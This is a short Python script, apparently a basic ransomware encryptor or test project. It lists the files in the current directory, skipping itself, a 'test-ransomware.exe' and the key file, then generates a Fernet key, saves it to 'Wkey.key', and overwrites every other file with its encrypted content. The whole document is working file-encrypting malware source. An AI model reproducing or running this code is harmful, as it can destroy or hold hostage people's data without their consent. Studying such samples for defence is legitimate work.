import os
import time

from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "testfile.py" or file == "test-ransomware.exe" or file == "Wkey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

print(key)

with open("Wkey.key", "wb") as Wkey:
    Wkey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)